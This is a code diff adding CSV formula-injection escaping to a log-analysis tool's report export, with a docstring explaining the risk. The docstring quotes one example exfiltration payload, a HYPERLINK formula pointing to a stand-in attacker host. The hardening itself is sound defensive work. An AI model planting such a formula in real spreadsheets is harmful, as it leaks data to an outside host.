@@ -24,6 +24,31 @@ CSV_FIELDNAMES = [
     "source_file", "source_ip", "username", "evidence_lines",
 ]
 
+# Fields that can contain attacker-influenced content -- an IP, path, or
+# username in a log line is chosen by whoever generated the log traffic,
+# not by this tool, so any of these can carry a value crafted specifically
+# to become a spreadsheet formula once opened.
+_CSV_INJECTION_RISK_FIELDS = ("description", "source_ip", "username", "source_file")
+_FORMULA_TRIGGER_CHARS = ("=", "+", "-", "@", "\t", "\r")
+
+
+def _csv_safe(value: str) -> str:
+    """Neutralize spreadsheet formula injection in a CSV cell.
+
+    Excel and Google Sheets treat a cell beginning with =, +, -, @, a
+    tab, or a carriage return as a formula to evaluate on open, not
+    literal text. Since these fields can carry attacker-chosen content
+    (a crafted username or request path from a real log line), a value
+    like =HYPERLINK("http://evil.example/"&A1) would execute silently
+    the moment someone opens this report in a spreadsheet app. A single
+    leading quote forces every spreadsheet application to treat the
+    cell as plain text instead, without changing what a human reader
+    sees.
+    """
+    if value and value[0] in _FORMULA_TRIGGER_CHARS:
+        return "'" + value
+    return value
+
 
 def print_console_summary(result: AnalysisResult) -> None:
     """Print a human-readable summary to stdout, alerts grouped by
@@ -107,5 +132,7 @@ def export_csv(result: AnalysisResult, output_path: str | Path) -> Path:
             row["evidence_lines"] = ";".join(str(n) for n in row["evidence_lines"])
             row["source_ip"] = row["source_ip"] or ""
             row["username"] = row["username"] or ""
+            for field in _CSV_INJECTION_RISK_FIELDS:
+                row[field] = _csv_safe(row[field])
             writer.writerow(row)
     return output_path
